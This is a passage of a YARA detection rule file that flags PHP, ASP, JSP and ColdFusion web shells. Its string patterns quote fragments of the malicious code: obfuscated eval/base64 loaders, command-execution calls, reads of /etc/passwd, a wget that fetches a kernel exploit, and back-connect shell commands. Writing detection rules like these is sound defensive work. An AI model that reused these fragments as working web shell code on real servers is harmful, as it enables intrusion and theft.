      $s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )
}

rule DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3_RID3552 : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7ea49d5c29f1242f81f2393b514798ff7caccb50d46c60bdfcf61db00043473b"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
      $s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii
   condition: 
      ( uint16 ( 0 ) == 0x3c0a and filesize < 300KB and all of them )
}

rule Unknown_8af033424f9590a15472a23cc3236e68070b952e_RID345B : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 15:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3382b5eaaa9ad651ab4793e807032650667f9d64356676a16ae3e9b02740ccf3"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$check = $_SERVER['DOCUMENT_ROOT']" fullword ascii
      $s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
      $s3 = "fwrite($fp,base64_decode('" ascii
   condition: 
      ( uint16 ( 0 ) == 0x6324 and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )
}

rule DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d_RID352C : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:01:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "51a16b09520a3e063adf10ff5192015729a5de1add8341a43da5326e626315bd"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "DK Shell - Took the Best made it Better..!!" fullword ascii
      $x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
      $x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" fullword ascii
      $s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s9 = "$x = $_GET[\"x\"];" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )
}

rule WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901_RID355F : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b1733cbb0eb3d440c4174cc67ca693ba92308ded5fc1069ed650c3c78b1da4bc"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
      $s2 = "input[type=text], input[type=password]{" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6c3c and filesize < 80KB and all of them )
}

rule Webshell_e8eaf8da94012e866e51547cd63bb996379690bf_RID3586 : DEMO FILE SCRIPT T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "027544baa10259939780e97dc908bd43f0fb940510119fc4cce0883f3dd88275"
      tags = "DEMO, FILE, SCRIPT, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "@exec('./bypass/ln -s /etc/passwd 1.php');" fullword ascii
      $x2 = "echo \"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \";" fullword ascii
      $x3 = "@exec('tar -xvf mysqldumper.tar.gz');" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x213c and filesize < 100KB and 1 of ( $x* ) ) or ( 2 of them )
}

rule Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167_RID3522 : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:00:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6362372850ac7455fa9461ed0483032a1886543f213a431f81a2ac76d383b47e"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/libraries/lola.php\" ;" fullword ascii
      $s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
      $s3 = "fwrite($fp,base64_decode('" ascii
   condition: 
      ( uint16 ( 0 ) == 0x6324 and filesize < 2KB and all of them )
}

rule WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7_2_RID36D5 : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 17:12:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d053086907aed21fbb6019bf9e644d2bae61c63563c4c3b948d755db3e78f395"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" fullword ascii
      $s9 = "$mosimage_session = \"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them )
}

rule WebShell_Generic_1609_A_RID2F12 : DEMO FILE GEN T1505_003 WEBSHELL {
   meta:
      description = "Detects a PHP webshell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 11:41:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035"
      hash3 = "69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e"
      tags = "DEMO, FILE, GEN, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "return $qwery45234dws($b);" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and 1 of them )
}

rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57_RID3A88 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 19:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
      hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$_POST['cmd'] = which('" ascii
      $s2 = "$blah = ex(" ascii
   condition: 
      filesize < 600KB and all of them
}

rule Webshell_c100_RID2B9A : DEMO T1087_001 T1105 T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files c100 v. 777shell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 09:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
      hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
      tags = "DEMO, T1087_001, T1105, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
      $s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
      $s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
      $s4 = "which wget curl w3m lynx" ascii
      $s6 = "netstat -atup | grep IST" ascii
   condition: 
      filesize < 685KB and 2 of them
}

rule Webshell_27_9_acid_c99_locus7s_RID31FA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 13:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
   condition: 
      filesize < 1711KB and 1 of them
}

rule Webshell_27_9_c66_c99_RID2E09 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php, c993.txt ..."
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
      $s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
      $s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
   condition: 
      filesize < 685KB and 1 of them
}

rule Webshell_Ayyildiz_RID2DF5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5"
      hash2 = "9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a"
      hash3 = "2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
      $s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
   condition: 
      filesize < 112KB and all of them
}

rule Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256_RID3D6B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 21:53:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash2 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
      hash3 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
      $s2 = "foreach($quicklaunch2 as $item) {" fullword ascii
   condition: 
      filesize < 882KB and all of them
}

rule Webshell_AcidPoison_RID2E8F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Poison Sh3ll - Webshell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 11:19:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash3 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
   condition: 
      filesize < 550KB and all of them
}

rule Webshell_acid_AntiSecShell_3_RID31C7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell Acid"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 13:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
      $s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
   condition: 
      filesize < 900KB and all of them
}

rule Webshell_r57shell_2b_RID2E8F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell R57"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 11:19:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash2 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
      hash3 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
      $s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
   condition: 
      filesize < 900KB and all of them
}

rule Webshell_zehir_RID2CC8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:03:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218"
      hash2 = "0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6"
      hash3 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
      $s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
   condition: 
      filesize < 200KB and 1 of them
}

rule Webshell_c99_4_RID2C0E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects C99 Webshell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 09:32:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash3 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
      $s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
      $s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
      $s4 = "$ret = myshellexec($handler);" fullword ascii
      $s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii
   condition: 
      filesize < 900KB and 1 of them
}

rule WebShell_PHP_Web_Kit_v3_RID2F7A : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects PAS Tool PHP Web Kit"
      author = "Florian Roth"
      reference = "https://github.com/wordfence/grizzly"
      date = "2016-01-01 11:58:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $php = "<?php $" 
      $php2 = "@assert(base64_decode($_REQUEST[" 
      $s1 = "(str_replace(\"\\n\", '', '" 
      $s2 = "(strrev($" ascii
      $s3 = "de'.'code';" ascii
   condition: 
      ( ( uint32 ( 0 ) == 0x68703f3c and $php at 0 ) or $php2 ) and filesize > 8KB and filesize < 100KB and all of ( $s* )
}

rule WebShell_PHP_Web_Kit_v4_RID2F7B : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects PAS Tool PHP Web Kit"
      author = "Florian Roth"
      reference = "https://github.com/wordfence/grizzly"
      date = "2016-01-01 11:59:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $php = "<?php $" 
      $s1 = "(StR_ReplAcE(\"\\n\",''," 
      $s2 = ";if(PHP_VERSION<'5'){" ascii
      $s3 = "=SuBstr_rePlACe(" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and $php at 0 and filesize > 8KB and filesize < 100KB and 2 of ( $s* )
}

rule IronPanda_Webshell_JSP_RID2F6E : APT CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Iron Panda Malware JSP"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 11:56:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
      $s2 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
      $s3 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
   condition: 
      filesize < 330KB and 1 of them
}

rule CN_Honker_Webshell_PHP_php5_RID3120 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php5.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user" ascii
      $s20 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$" ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them
}

rule CN_Honker_Webshell_test3693_RID30F1 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file test3693.war"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:01:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - " ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 50KB and all of them
}

rule CN_Honker_Webshell_mycode12_RID3140 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mycode12.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:14:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<cfexecute name=\"cmd.exe\"" fullword ascii
      $s2 = "<cfoutput>#cmd#</cfoutput>" fullword ascii
   condition: 
      filesize < 4KB and all of them
}

rule CN_Honker_Webshell_offlibrary_RID328C : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file offlibrary.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:09:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "';$i=$g->query(\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING" ascii
      $s12 = "if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju" ascii
   condition: 
      filesize < 1005KB and all of them
}

rule CN_Honker_Webshell_cfm_xl_RID30D5 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file xl.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input name=\"DESTINATION\" value=\"" ascii
      $s1 = "<CFFILE ACTION=\"Write\" FILE=\"#Form.path#\" OUTPUT=\"#Form.cmd#\">" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x433c and filesize < 13KB and all of them
}

rule CN_Honker_Webshell_PHP_linux_RID31D3 : CHINA DEMO FILE LINUX T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file linux.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:39:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, LINUX, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<form name=form1 action=exploit.php method=post>" fullword ascii
      $s1 = "<title>Changing CHMOD Permissions Exploit " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x696c and filesize < 6KB and all of them
}

rule CN_Honker_Webshell_Interception3389_get_RID35C6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file get.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:27:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "userip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii
      $s1 = "file.writeline  szTime + \" HostName:\" + szhostname + \" IP:\" + userip+\":\"+n" ascii
      $s3 = "set file=fs.OpenTextFile(server.MapPath(\"WinlogonHack.txt\"),8,True)" fullword ascii
   condition: 
      filesize < 3KB and all of them
}

rule CN_Honker_Webshell_nc_1_RID2FBD : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file 1.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:10:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 " ascii
      $s2 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
   condition: 
      filesize < 11KB and all of them
}

rule CN_Honker_Webshell_PHP_BlackSky_RID32B7 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php6.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:17:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "eval(gzinflate(base64_decode('" ascii
      $s1 = "B1ac7Sky-->" fullword ascii
   condition: 
      filesize < 641KB and all of them
}

rule CN_Honker_Webshell_ASP_asp3_RID3116 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp3.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii
      $s2 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", Tru" ascii
   condition: 
      filesize < 444KB and all of them
}

rule CN_Honker_Webshell_ASPX_sniff_RID320D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
